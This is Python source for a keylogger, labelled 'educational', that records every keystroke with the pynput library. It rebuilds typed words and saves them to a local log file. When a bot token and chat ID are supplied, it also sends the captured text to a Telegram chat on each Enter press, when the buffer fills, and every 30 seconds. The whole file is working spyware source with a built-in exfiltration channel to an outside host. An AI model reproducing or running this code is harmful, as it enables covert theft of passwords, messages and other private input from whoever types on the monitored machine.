from pynput import keyboard
import datetime
import threading
import requests


class SimpleKeylogger:
    def __init__(self, filename="keylog.txt", telegram_token=None, telegram_chat_id=None):
        self.filename = filename
        self.start_time = datetime.datetime.now()
        self.key_count = 0
        self.current_word = ""
        self.buffer = ""
        self.telegram_token = telegram_token
        self.telegram_chat_id = telegram_chat_id
        self.running = True
        self.timer = None
        self.timer_interval = 30  # detik

    def send_telegram(self, message):
        if not self.telegram_token or not self.telegram_chat_id:
            return
        try:
            url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
            data = {"chat_id": self.telegram_chat_id, "text": message}
            requests.post(url, data=data, timeout=5)
        except Exception:
            pass

    def flush_buffer(self):
        if self.buffer:
            with open(self.filename, "a", encoding="utf-8") as f:
                f.write(self.buffer)

            self.send_telegram(self.buffer)
            self.buffer = ""

    def periodic_flush(self):
        if self.running:
            self.flush_buffer()
            self.timer = threading.Timer(self.timer_interval, self.periodic_flush)
            self.timer.daemon = True
            self.timer.start()

    def print_banner(self):
        banner = """
    __ __          __                          
   / //_/__  __  __/ /___  ____ _____ ____  _____
  / ,<  / _ \/ / / / / __ \/ __ `/ __ `/ _ \/ ___/
 / /| |/  __/ /_/ / / /_/ / /_/ / /_/ /  __/ /    
/_/ |_|\___/\__, /_/\____/\__, /\__, /\___/_/     
           /____/        /____//____/              
"""
        print("\033[1;34m" + banner + "\033[0m")
        print("\033[1;37m" + "=" * 70 + "\033[0m")
        print("\033[1;33m[*]\033[0m Educational Keylogger v1.0 (Telegram Enabled)")
        print("\033[1;33m[*]\033[0m Starting at: \033[1;32m{}\033[0m".format(
            self.start_time.strftime('%Y-%m-%d %H:%M:%S')))
        print("\033[1;33m[*]\033[0m Log file: \033[1;32m{}\033[0m".format(self.filename))
        if self.telegram_token:
            print("\033[1;33m[*]\033[0m Telegram: \033[1;32mEnabled\033[0m")
        else:
            print("\033[1;33m[*]\033[0m Telegram: \033[1;31mDisabled\033[0m")
        print("\033[1;37m" + "=" * 70 + "\033[0m")
        print()

    def display_word(self):
        if self.current_word:
            current_time = datetime.datetime.now().strftime("%H:%M:%S")
            word_entry = f"[{current_time}] [WORD] {self.current_word}\n"
            print("\033[1;36m[WORD]\033[0m {}".format(self.current_word))
            self.buffer += word_entry
            self.current_word = ""

    def on_press(self, key):
        try:
            current_time = datetime.datetime.now().strftime("%H:%M:%S")
            char = key.char
            log_entry = f"[{current_time}] {char}\n"
            self.key_count += 1
            self.current_word += char
            print("\033[1;32m[{}]\033[0m {}".format(current_time, char))
        except AttributeError:
            current_time = datetime.datetime.now().strftime("%H:%M:%S")
            special_keys = {
                keyboard.Key.space: "[SPACE]",
                keyboard.Key.enter: "[ENTER]",
                keyboard.Key.tab: "[TAB]",
                keyboard.Key.backspace: "[BACKSPACE]",
                keyboard.Key.shift: "[SHIFT]",
                keyboard.Key.shift_r: "[SHIFT_R]",
                keyboard.Key.ctrl_l: "[CTRL]",
                keyboard.Key.ctrl_r: "[CTRL_R]",
                keyboard.Key.alt_l: "[ALT]",
                keyboard.Key.alt_r: "[ALT_R]",
                keyboard.Key.caps_lock: "[CAPS_LOCK]",
                keyboard.Key.esc: "[ESC]",
                keyboard.Key.delete: "[DELETE]",
                keyboard.Key.home: "[HOME]",
                keyboard.Key.end: "[END]",
                keyboard.Key.page_up: "[PAGE_UP]",
                keyboard.Key.page_down: "[PAGE_DOWN]",
            }
            key_name = special_keys.get(key, str(key))
            log_entry = f"[{current_time}] {key_name}\n"
            self.key_count += 1

            if key in [keyboard.Key.space, keyboard.Key.enter, keyboard.Key.tab]:
                self.display_word()
                if key == keyboard.Key.enter:
                    self.flush_buffer()
            elif key == keyboard.Key.backspace:
                if self.current_word:
                    self.current_word = self.current_word[:-1]
            elif key == keyboard.Key.esc:
                if self.current_word:
                    self.display_word()
                print("\n\033[1;31m[!]\033[0m ESC detected, stopping keylogger...")
                return False

            print("\033[1;32m[{}]\033[0m {}".format(current_time, key_name))

        except Exception:
            return True

        if key != keyboard.Key.esc:
            self.buffer += log_entry

        if len(self.buffer) >= 200:
            self.flush_buffer()

        return True

    def print_footer(self):
        end_time = datetime.datetime.now()
        duration = end_time - self.start_time

        print()
        print("\033[1;37m" + "=" * 70 + "\033[0m")
        print("\033[1;33m[*]\033[0m Keylogger stopped")
        print("\033[1;33m[*]\033[0m End time: \033[1;32m{}\033[0m".format(
            end_time.strftime('%Y-%m-%d %H:%M:%S')))
        print("\033[1;33m[*]\033[0m Duration: \033[1;32m{}\033[0m".format(duration))
        print("\033[1;33m[*]\033[0m Total keys logged: \033[1;32m{}\033[0m".format(self.key_count))
        print("\033[1;33m[*]\033[0m Log saved to: \033[1;32m{}\033[0m".format(self.filename))
        print("\033[1;37m" + "=" * 70 + "\033[0m")

    def start(self):
        import os
        os.system('clear' if os.name == 'posix' else 'cls')

        self.print_banner()

        print("\033[1;33m[*]\033[0m Press \033[1;31mESC\033[0m to stop the keylogger")
        print("\033[1;33m[*]\033[0m Listening for keystrokes...\n")
        print("\033[1;37m" + "-" * 70 + "\033[0m\n")

        if self.telegram_token and self.telegram_chat_id:
            self.timer = threading.Timer(self.timer_interval, self.periodic_flush)
            self.timer.daemon = True
            self.timer.start()

        try:
            with keyboard.Listener(on_press=self.on_press) as listener:
                listener.join()
        finally:
            self.running = False
            if self.timer:
                self.timer.cancel()
            self.flush_buffer()
            self.print_footer()